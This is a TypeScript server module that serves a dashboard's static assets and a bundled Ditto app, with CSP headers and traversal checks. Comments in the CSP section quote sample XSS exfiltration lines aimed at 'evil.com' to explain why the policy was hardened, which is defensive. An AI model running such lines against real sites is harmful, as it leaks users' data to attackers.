/**
 * Static-asset serving for the dashboard — extracted from web-server.ts
 * as part of the D13 split.
 *
 * Two handlers, each returning `boolean` (true iff a response was written
 * and the parent should stop dispatching):
 *
 *   - serveVendorXterm — serves files under /vendor/xterm/* from the
 *     installed node_modules. Whitelist-gated; no traversal.
 *   - serveStatic      — serves files from WEB_DIR (resolved at module
 *     load from src/web in dev, dist/web in prod). HTML responses get
 *     the security-header set.
 *
 * The MIME map and security headers move with the handlers. WEB_DIR and
 * HTML_SECURITY_HEADERS are re-exported because the SPA-fallback in
 * web-server.ts (the setup-route's /index.html send) reads both directly.
 */
import http from 'http';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

// Resolved relative to this file at runtime — whether we're running from
// dist/lib/web-server-static.js (copy-web.mjs put the assets at dist/web)
// or from src via tsx (falls back to src/web so `npm run dev chat`
// still works). Indentical layout to the dist/src layouts used elsewhere
// in lib/ (see _shared.ts CLI_BIN derivation).
const here = path.dirname(fileURLToPath(import.meta.url));
const WEB_DIR_CANDIDATES = [
  path.resolve(here, '..', 'web'),              // dist/web next to dist/lib
  path.resolve(here, '..', '..', 'src', 'web'), // src/web when running via tsx
];
export const WEB_DIR = WEB_DIR_CANDIDATES.find(p => fs.existsSync(p)) ?? WEB_DIR_CANDIDATES[0];

// Vendored frontend libs (xterm.js)
//
// We don't commit xterm.js bundles to the repo or duplicate-copy them into
// dist/web at build time. Instead the server resolves `/vendor/xterm/<file>`
// requests to the files already in node_modules (installed as regular deps)
// at runtime. Works in dev (tsx → src/web/) and prod (node dist/lib/) alike
// because node_modules is alongside our install root in both layouts.
//
// stationRoot is the directory containing our package.json — `..` from
// dist/lib lands at dist/, then one more `..` lands at the repo / install
// root; identical from src/lib in dev mode.
const STATION_ROOT = path.resolve(here, '..', '..');

// Whitelist of vendor files we're willing to serve. The map binds each URL
// segment to the node_modules path that produces it. Requests for anything
// not in this map fall through to 404, so a compromised client can't
// traverse into arbitrary node_modules paths.
const VENDOR_XTERM: Record<string, string> = {
  'xterm.js':            'node_modules/@xterm/xterm/lib/xterm.js',
  'xterm.css':           'node_modules/@xterm/xterm/css/xterm.css',
  'addon-fit.js':        'node_modules/@xterm/addon-fit/lib/addon-fit.js',
  'addon-web-links.js':  'node_modules/@xterm/addon-web-links/lib/addon-web-links.js',
};

const MIME: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.js':   'application/javascript; charset=utf-8',
  '.svg':  'image/svg+xml',
  '.png':  'image/png',
  '.ico':  'image/x-icon',
  '.json': 'application/json',
};

// Security headers applied only to HTML responses (index.html, /setup SPA
// route). JSON/SSE responses are framework-style content, not documents, so
// applying CSP to them just adds noise in devtools. The policy allows inline
// <script>/<style> because the current dashboard uses them and innerHTML
// throughout; tightening to nonces is a future pass. `connect-src` covers the
// loopback WebSocket and any outbound nostr relay (wss://). frame-ancestors
// 'none' prevents clickjacking; X-Frame-Options is kept as a belt-and-braces
// for older browsers.
export const HTML_SECURITY_HEADERS: Record<string, string> = {
  'X-Frame-Options': 'DENY',
  'X-Content-Type-Options': 'nosniff',
  // `same-origin` (not `no-referrer`) is intentional: browsers don't always
  // send Origin on same-origin GETs, but they DO send Referer under this
  // policy, which the `?token=` fetch-guard needs to distinguish a
  // dashboard-initiated EventSource from a cross-origin attacker request.
  // Cross-origin requests get zero Referer info, same as `no-referrer`.
  // 'no-referrer' (was 'same-origin'). Tighter so even SSE / WS / API
  // URLs that carry a token in the query string can't leak it via
  // Referer header on subsequent outbound navigation (e.g. clicking
  // an external link from a logs panel that streams to ?token=…).
  'Referrer-Policy': 'no-referrer',
  'Content-Security-Policy': [
    "default-src 'self'",
    "frame-ancestors 'none'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    // script-src no longer allows 'unsafe-inline' — the dashboard's
    // sole inline <script> (theme-preload) was extracted to a separate
    // .js file. style-src keeps 'unsafe-inline' because the Ditto
    // theme path injects dynamic <style> blocks via app.js's
    // applyDittoStyleBlock() and the theme-preload bootstrap.
    // Refactoring that to CSS variables only is tracked in the plan
    // as a follow-up audit.
    "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    // External relay WS goes through /api/relay-proxy (see
    // src/lib/routes/relay-proxy.ts) so the dashboard origin is the
    // only place the browser ever connects to. Loopback ws://*
    // remains for the in-process relay and the terminal WS upgrade.
    // Closes the "future XSS exfiltrates via new WebSocket('wss://evil.com')"
    // channel — without the proxy that connection would succeed under
    // the old `wss:` token.
    "connect-src 'self' ws://127.0.0.1:* ws://localhost:*",
    // img-src tightened from 'self' data: https: → 'self' data:.
    // Every external image now routes through /api/img-proxy (see
    // src/lib/img-proxy.ts) so the response bytes arrive over the
    // dashboard origin, satisfying 'self'. This closes the "future
    // XSS exfiltrates via new Image().src = 'evil.com/?leak=…'"
    // channel — without the proxy that load would succeed under the
    // old `https:` token.
    "img-src 'self' data:",
    "font-src 'self' data:",
    // Loopback only — used by the chat panel's live-preview iframe to
    // embed a project's local Vite dev server (default :5173) AND by the
    // nsite panel to embed per-nsite-origin content from
    // *.nsite.localhost (introduced in PR-B / #121). Two halves of the
    // same handshake have to agree before an iframe will load:
    //   - frame-ancestors on the nsite response says "OK to embed me at
    //     localhost:<port>" (handled in routes/nsite.ts:buildCspForRequest)
    //   - frame-src on the DASHBOARD page (this directive) says
    //     "OK to load *.nsite.localhost into one of my iframes"
    // Without the wildcard-subdomain entry here, the dashboard's CSP
    // refuses to load any <sid>.nsite.localhost iframe and the browser
    // shows "This content is blocked. Contact the site owner to fix
    // the issue." — the failure surfaced after #121 even though
    // frame-ancestors was correctly granted by the nsite response.
    // Cross-origin frames OUTSIDE this set are still rejected, and
    // frame-ancestors 'none' above keeps the dashboard itself
    // un-embeddable.
    "frame-src 'self' http://127.0.0.1:* http://localhost:* http://*.nsite.localhost:*",
  ].join('; '),
};

export function serveVendorXterm(req: http.IncomingMessage, res: http.ServerResponse): boolean {
  const urlPath = (req.url || '/').split('?')[0];
  const m = urlPath.match(/^\/vendor\/xterm\/([a-z0-9.-]+)$/i);
  if (!m) return false;
  const rel = VENDOR_XTERM[m[1]];
  if (!rel) return false;
  const file = path.join(STATION_ROOT, rel);
  if (!fs.existsSync(file)) return false;
  const ext  = path.extname(file).toLowerCase();
  const mime = MIME[ext] ?? 'application/octet-stream';
  res.writeHead(200, {
    'Content-Type':  mime,
    // xterm bundles are immutable per install — safe to cache aggressively.
    // Clients pick up upgrades via cache-busting query strings from index.html.
    'Cache-Control': 'public, max-age=604800, immutable',
  });
  fs.createReadStream(file).pipe(res);
  return true;
}

// Lazy-resolve the bundled Ditto dist directory. fetch-ditto.mjs writes
// to <repo-root>/dist/ditto/ at `npm run build` time; in prod that's a
// sibling of dist/lib, in dev (tsx) it's two levels up from src/lib.
// Resolved per-request rather than at module load so a runtime
// `npm run update-ditto` is picked up without restarting the dashboard.
const DITTO_DIR_CANDIDATES = [
  path.resolve(here, '..', 'ditto'),
  path.resolve(here, '..', '..', 'dist', 'ditto'),
];
function dittoDir(): string | null {
  for (const d of DITTO_DIR_CANDIDATES) {
    try { if (fs.statSync(d).isDirectory()) return d; } catch {}
  }
  return null;
}

// Extended MIME map for Ditto's static assets — fonts, manifests,
// images Ditto ships that the dashboard's narrow MIME map doesn't
// cover. Keeps Ditto's bundle self-consistent.
const DITTO_MIME: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.js':   'application/javascript; charset=utf-8',
  '.mjs':  'application/javascript; charset=utf-8',
  '.json': 'application/json',
  '.webmanifest': 'application/manifest+json',
  '.svg':  'image/svg+xml',
  '.png':  'image/png',
  '.jpg':  'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif':  'image/gif',
  '.webp': 'image/webp',
  '.ico':  'image/x-icon',
  '.woff':  'font/woff',
  '.woff2': 'font/woff2',
  '.ttf':   'font/ttf',
  '.otf':   'font/otf',
  '.txt':   'text/plain; charset=utf-8',
  '.md':    'text/markdown; charset=utf-8',
  '.map':   'application/json',
};

// Root-anchored paths Ditto's prebuilt bundle fetches as if served at /.
// Vite's default `base: '/'` bakes absolute paths into index.html, into
// CSS url() references for fonts, AND into runtime fetch() calls in
// minified JS (the changelog page hits /CHANGELOG.md; the splash screen
// hits /logo.svg). Patching the bundle would only catch the static
// references, so we alias these at the server instead — they resolve
// to dist/ditto/<file> regardless of whether the request originated
// from /ditto/ or anywhere else with these paths.
//
// /assets/* covers JS chunks, CSS, fonts (all of the asset volume).
// The named root files are everything else Ditto's bundle reaches for
// that isn't under /assets/. None of these names overlap with the
// dashboard's own static tree (dist/web/ — index.html, app.js, app.css,
// nori.svg, etc.), so the alias is unambiguous.
const DITTO_ROOT_FILES = new Set([
  '/logo.svg',
  '/apple-touch-icon.png',
  '/manifest.webmanifest',
  '/ditto.json',
  '/CHANGELOG.md',
  '/404.html',
]);

// Serve the bundled Ditto SPA. Two URL shapes:
//
//   - /ditto/* — the iframe's own URL space. /ditto/ → index.html;
//     subpaths → real files when present, SPA-fallback to index.html
//     for client-router routes (per Ditto's docs).
//   - /assets/* + the DITTO_ROOT_FILES allowlist — root-anchored
//     fetches from inside the iframe. Aliased to dist/ditto/<rest>
//     so the bundle works without rebuilding it with base: '/ditto/'.
//
// Responses:
//   - File present → served with the appropriate MIME + a long-lived
//     cache for fingerprinted assets, no-cache for HTML.
//   - /ditto/* miss with an extension → 404 (real missing-asset signal).
//   - /ditto/* miss without an extension → SPA fallback to index.html.
//   - Root-aliased miss → fall through to serveStatic (return false) so
//     the regular static handler can 404 cleanly.
//   - Ditto not bundled, /ditto entry → 404 JSON with
//     { error: 'ditto-not-bundled' } so the Client panel detects the
//     state and surfaces a clear message. Root-aliased requests in
//     this state just fall through.
//
// Deliberately does NOT apply HTML_SECURITY_HEADERS. Ditto's SPA bundle
// expects its own CSP context (inline scripts, eval-ish code paths in
// some bundlers) and our restrictive policy would break it. Same-origin
// hosting + the dashboard's `frame-src 'self'` are what gate access.
export function serveDitto(req: http.IncomingMessage, res: http.ServerResponse): boolean {
  const urlPath = (req.url || '/').split('?')[0];
  const isPrefixed   = urlPath === '/ditto' || urlPath.startsWith('/ditto/');
  const isRootAlias  = urlPath.startsWith('/assets/') || DITTO_ROOT_FILES.has(urlPath);
  if (!isPrefixed && !isRootAlias) return false;

  const dir = dittoDir();
  if (!dir) {
    // Only the /ditto entry point reports the not-bundled state to the
    // panel — root-aliased misses fall through to serveStatic, which
    // 404s like any other missing asset.
    if (!isPrefixed) return false;
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      error: 'ditto-not-bundled',
      hint:  'run `npm run build` (or `npm run update-ditto`) to build the Ditto bundle.',
    }));
    return true;
  }

  // Resolve to a relative path inside dist/ditto/. For /ditto/* strip
  // the prefix; for root-aliased paths the URL already points at the
  // file's location inside the bundle (e.g. /assets/foo.js → assets/foo.js).
  let rel: string;
  if (isPrefixed) {
    rel = (urlPath === '/ditto' || urlPath === '/ditto/')
      ? '/index.html'
      : urlPath.slice('/ditto'.length);
  } else {
    rel = urlPath;
  }
  // Defence in depth — block .. traversal back out of DITTO_DIR.
  const resolved = path.resolve(dir, '.' + rel);
  if (!resolved.startsWith(dir)) {
    res.writeHead(403); res.end(); return true;
  }

  let target = resolved;
  let isSpaFallback = false;
  if (!fs.existsSync(target) || !fs.statSync(target).isFile()) {
    // Root-aliased miss → not our problem. Fall through so the regular
    // static handler can 404. SPA fallback only makes sense for the
    // /ditto/* URL space (client-side router navigation).
    if (!isPrefixed) return false;
    // SPA fallback: any path without a file extension → index.html.
    // Paths WITH an extension that aren't on disk → real 404 (otherwise
    // missing assets silently get HTML, which masks bugs).
    const ext = path.extname(rel);
    if (ext) {
      res.writeHead(404); res.end('not found'); return true;
    }
    target = path.join(dir, 'index.html');
    if (!fs.existsSync(target)) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'ditto-not-bundled' }));
      return true;
    }
    isSpaFallback = true;
  }

  const ext = path.extname(target).toLowerCase();
  const mime = DITTO_MIME[ext] ?? 'application/octet-stream';
  const isHtml = ext === '.html' || isSpaFallback;
  const headers: Record<string, string> = {
    'Content-Type': mime,
    // Fingerprinted assets in /ditto/assets/* are safe to cache forever.
    // index.html (and the SPA fallback) stays no-cache so app-shell
    // updates land on the next reload after `npm run update-ditto`.
    'Cache-Control': isHtml ? 'no-cache' : 'public, max-age=86400',
  };
  // HTML responses get an inline script injected right after <head>.
  // Ditto's bundle is built with `base: '/'`, so its React Router only
  // knows about root paths (`/`, `/feed`, `/notifications`, …). When the
  // iframe mounts at `/ditto/` the router sees `/ditto/`, finds no match,
  // and renders its catch-all 404 — even though the rest of Ditto's
  // shell is fine. Stripping the `/ditto` prefix with `replaceState`
  // BEFORE the deferred module bundle executes lets the router pick up
  // the real route on first paint. Internal navigation (`<Link>` →
  // pushState) already operates at root, so this only matters for the
  // initial load and any SPA-fallback deep-link.
  const method = (req.method || 'GET').toUpperCase();
  let body: Buffer | null = null;
  if (isHtml) {
    let html: string;
    try { html = fs.readFileSync(target, 'utf8'); }
    catch { res.writeHead(500); res.end(); return true; }
    html = html.replace(/<head(\s[^>]*)?>/i, (m) => m + DITTO_PREFIX_STRIP_SCRIPT);
    body = Buffer.from(html, 'utf8');
    headers['Content-Length'] = String(body.length);
  }
  // HEAD responses get headers + Content-Length but no body. The Client
  // panel's bundle-presence probe uses HEAD; without this branch the
  // probe falls through to a 404 default and the panel falsely shows
  // the "Ditto not installed" state even when the bundle is there.
  if (method === 'HEAD') {
    if (!isHtml) {
      try { headers['Content-Length'] = String(fs.statSync(target).size); } catch {}
    }
    res.writeHead(200, headers);
    res.end();
    return true;
  }
  if (body) {
    res.writeHead(200, headers);
    res.end(body);
    return true;
  }
  res.writeHead(200, headers);
  fs.createReadStream(target).pipe(res);
  return true;
}

// Inline script injected into every HTML response from the Ditto bundle.
// Runs synchronously during <head> parsing — i.e. before any of Ditto's
// <script type="module"> tags (which are deferred by default) AND before
// Ditto's CSP meta tag is encountered, so the inline `<script>` is not
// blocked. Two responsibilities:
//
//   1. Strip the `/ditto` prefix from `location.pathname` so Ditto's
//      BrowserRouter (built with `base: '/'`) matches its real routes
//      on initial mount instead of falling through to the 404 view.
//
//   2. Intercept outbound navigations to known public nsite gateways
//      (the same set the resolver in src/lib/nsite-resolver.ts groks)
//      and bounce them up to the parent dashboard via postMessage. The
//      parent's ClientPanel hands the URL to the nsite panel via the
//      existing `#nsite/<addr>` deep-link, so "Visit" on a Ditto nsite
//      card opens our embedded browser instead of an external tab.
//
// Both window.open and click-on-<a> are intercepted; either is how Ditto
// might trigger the external navigation in practice.
const DITTO_PREFIX_STRIP_SCRIPT =
  '<script>(function(){'
  // (1) /ditto prefix strip
  + 'var p=location.pathname;'
  + 'if(p===\'/ditto\'||p===\'/ditto/\'){history.replaceState(null,\'\',\'/\'+location.search+location.hash);}'
  + 'else if(p.indexOf(\'/ditto/\')===0){history.replaceState(null,\'\',p.slice(6)+location.search+location.hash);}'
  // (2) nsite-gateway intercept — keep this regex aligned with the
  // gateway alternation in src/lib/nsite-resolver.ts:278.
  + 'var GW=/^[^.]+\\.(?:nsite\\.lol|nsite\\.run|nsite\\.cloud|nosto\\.re|nwb\\.tf|nostr\\.hu)$/i;'
  + 'function isNsite(s){if(typeof s!==\'string\')return false;'
  +   'try{var u=new URL(s,location.href);'
  +     'return(u.protocol===\'http:\'||u.protocol===\'https:\')&&GW.test(u.hostname);}'
  +   'catch(_){return false;}}'
  + 'function notify(u){try{parent.postMessage({type:\'station:open-nsite\',url:String(u)},location.origin);}catch(_){}}'
  + 'var _open=window.open;'
  + 'window.open=function(u){if(isNsite(u)){notify(u);return null;}return _open.apply(this,arguments);};'
  + 'document.addEventListener(\'click\',function(e){'
  +   'if(e.defaultPrevented)return;'
  +   'var n=e.target;while(n&&n.nodeType===1&&n.tagName!==\'A\')n=n.parentNode;'
  +   'if(!n||n.tagName!==\'A\')return;'
  +   'var h=n.getAttribute(\'href\');if(!isNsite(h))return;'
  +   'e.preventDefault();e.stopPropagation();notify(h);'
  + '},true);'
  + '})();</script>';

export function serveStatic(req: http.IncomingMessage, res: http.ServerResponse): boolean {
  const urlPath = (req.url || '/').split('?')[0];
  const rel = urlPath === '/' ? '/index.html' : urlPath;
  // Block traversal — we never serve outside WEB_DIR.
  const resolved = path.resolve(WEB_DIR, '.' + rel);
  if (!resolved.startsWith(WEB_DIR)) return false;
  if (!fs.existsSync(resolved) || !fs.statSync(resolved).isFile()) return false;

  const ext  = path.extname(resolved).toLowerCase();
  const mime = MIME[ext] ?? 'application/octet-stream';
  const headers: Record<string, string> = { 'Content-Type': mime, 'Cache-Control': 'no-cache' };
  if (mime.startsWith('text/html')) Object.assign(headers, HTML_SECURITY_HEADERS);
  res.writeHead(200, headers);
  fs.createReadStream(resolved).pipe(res);
  return true;
}
